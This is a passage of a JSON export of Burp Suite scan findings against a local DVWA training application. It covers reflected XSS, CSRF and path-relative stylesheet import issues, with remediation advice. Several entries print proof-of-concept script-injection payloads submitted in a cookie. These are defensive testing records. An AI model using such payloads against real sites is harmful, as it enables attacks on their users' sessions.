        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>wc26s'&gt;&lt;script&gt;alert(1)&lt;/script&gt;ref80</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain \"cookie-forcing\" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "46": {
        "\ufeffissue__serialNumber": "4.9659E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/xss_s/",
        "issue__location": "/dvwa/vulnerabilities/xss_s/ [security cookie]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "47": {
        "\ufeffissue__serialNumber": "5.23475E+18",
        "issue__type": "2098944",
        "issue__name": "Cross-site request forgery",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/csp/",
        "issue__location": "/dvwa/vulnerabilities/csp/",
        "issue__severity": "Medium",
        "issue__confidence": "Tentative",
        "issue__issueBackground": "<p>Cross-site request forgery (CSRF) vulnerabilities may arise when applications rely solely on HTTP cookies to identify the user that has issued a particular request. Because browsers automatically add cookies to requests regardless of their origin, it may be possible for an attacker to create a malicious web site that forges a cross-domain request to the vulnerable application. For a request to be vulnerable to CSRF, the following conditions must hold:</p>\\n<ul>\\n<li>The request can be issued cross-domain, for example using an HTML form. If the request contains non-standard headers or body content, then it may only be issuable from a page that originated on the same domain.</li>\\n<li>The application relies solely on HTTP cookies or Basic Authentication to identify the user that issued the request. If the application places session-related tokens elsewhere within the request, then it may not be vulnerable.</li>\\n<li>The request performs some privileged action within the application, which modifies the application's state based on the identity of the issuing user.</li><li>The attacker can determine all the parameters required to construct a request that performs the action. If the request contains any values that the attacker cannot determine or predict, then it is not vulnerable.</li></ul>",
        "issue__remediationBackground": "<p>The most effective way to protect against CSRF vulnerabilities is to include within relevant requests an additional token that is not transmitted in a cookie: for example, a parameter in a hidden form field. This additional token should contain sufficient entropy, and be generated using a cryptographic random number generator, such that it is not feasible for an attacker to determine or predict the value of any token that was issued to another user. The token should be associated with the user's session, and the application should validate that the correct token is received before performing any action resulting from the request.</p>\\n<p>An alternative approach, which may be easier to implement, is to validate that Host and Referer headers in relevant requests are both present and contain the same domain name. However, this approach is somewhat less robust: historically, quirks in browsers and plugins have often enabled attackers to forge cross-domain requests that manipulate these headers to bypass such defenses. </p>",
        "issue__references": "<ul>\\n    <li><a href=\"https://portswigger.net/web-security/csrf\">Web Security Academy: Cross-site request forgery</a></li>\\n    <li><a href=\"https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-\">Using Burp to Test for Cross-Site Request Forgery</a></li>\\n    <li><a href=\"https://media.blackhat.com/eu-13/briefings/Lundeen/bh-eu-13-deputies-still-confused-lundeen-wp.pdf\">The Deputies Are Still Confused</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/352.html\">CWE-352: Cross-Site Request Forgery (CSRF)</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/62.html\">CAPEC-62: Cross Site Request Forgery</a></li>\\n</ul>",
        "issue__issueDetail": "The request appears to be vulnerable to cross-site request forgery (CSRF) attacks against authenticated users.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "48": {
        "\ufeffissue__serialNumber": "8.78898E+18",
        "issue__type": "2097960",
        "issue__name": "Path-relative style sheet import",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/csrf/test_credentials.php",
        "issue__location": "/dvwa/vulnerabilities/csrf/test_credentials.php",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\\n<ol>\\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\\n<ul>\\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
        "issue__remediationBackground": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities\">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/154.html\">CAPEC-154: Resource Location Spoofing</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/468.html\">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "49": {
        "\ufeffissue__serialNumber": "2.2102E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/csp/",
        "issue__location": "/dvwa/vulnerabilities/csp/ [security cookie]",
        "issue__severity": "Medium",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>x2j3l'&gt;&lt;script&gt;alert(1)&lt;/script&gt;t14fsmxi1uo</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain \"cookie-forcing\" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "50": {
        "\ufeffissue__serialNumber": "1.56633E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/csp/",
        "issue__location": "/dvwa/vulnerabilities/csp/ [security cookie]",
        "issue__severity": "Medium",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
